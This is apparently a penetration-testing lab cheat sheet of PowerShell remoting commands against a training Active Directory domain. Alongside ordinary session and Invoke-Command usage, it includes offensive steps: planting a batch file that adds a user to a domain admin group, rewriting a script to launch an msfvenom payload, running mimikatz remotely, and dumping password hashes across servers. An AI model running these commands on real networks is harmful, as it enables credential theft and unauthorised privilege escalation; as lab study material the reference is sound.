# PowerShell Remoting 

## Connect to a PS-Session of a remote user
```powershell
Enter-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
```

## Execute Stateful commands using Enter-PSSession ( persistence )
```powershell
$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
Enter-PSSession -Session $sess

[dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> $proc = Get-Process
[dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> exit

Enter-PSSession -Session $sess

[dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> proc
Will list current process
```

## Execute Stateful commands using Invoke-Command ( persistence )
```powershell
$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
```

## Display allowed commands we can execute on remote machine
```powershell
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -command {get-command}
```

## Write File using ScriptBlock
```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'c:\program files\Keepmeon\admin.bat' -Value 'net group site_admin awallace /add /domain'}
```

## Edit file using ScriptBlock
```powershell
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {((cat "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\msfvenom.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred
```

## Command execution using command and ScriptBlock
```powershell
Invoke-Command -computername computer-name -ConfigurationName dc_manage -credential $cred -command {whoami}
Invoke-Command -computername computer-name -ConfigurationName dc_manage -credential $cred -ScriptBlock {whoami}
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -command {whoami}
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {whoami}
```

## File execution using ScriptBlock
```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock{"C:\temp\mimikatz.exe"}
```

## File execution using FilePath
```powershell
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath "C:\temp\mimikatz.exe"
```

## Language Mode
```powershell
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}
```

## Execute locally loaded function on the remote machines
Example : **Hello.ps1**
```powershell
function hello
{
Write-Output "Hello from the function"
}
```
> Now we can load the function on our machine
```powershell
. .\Hello.ps1
```
> Now we can execute the locally loaded functions 
```powershell
Invoke-Command -ScriptBlock ${function:hello} -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

## In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list of servers>) -
ArgumentList
```

## Directly load function on the remote machines using FilePath
```powershell
$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
Invoke-Command -FilePath "C:\temp\hello.ps1" -Session $sess
Enter-PSSession -Session $sess

[dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> hello
Hello from the function
```
